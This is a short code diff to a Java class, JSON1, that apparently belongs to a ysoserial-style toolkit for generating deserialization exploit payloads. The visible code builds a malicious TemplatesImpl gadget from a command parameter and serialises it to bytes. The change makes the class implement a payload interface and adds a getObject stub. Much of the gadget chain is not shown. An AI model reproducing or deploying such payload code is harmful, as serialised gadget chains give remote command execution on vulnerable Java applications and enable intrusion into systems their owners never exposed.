@@ -14,9 +14,9 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
-public class JSON1 {
+public class JSON1 implements ObjectPayload<Object>{
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object tql    = Gadgets.createTemplatesImpl(type, param);
         Class  ifaces = Templates.class;
         CompositeType rt = new CompositeType("a", "b",
@@ -55,5 +55,10 @@ public class JSON1 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
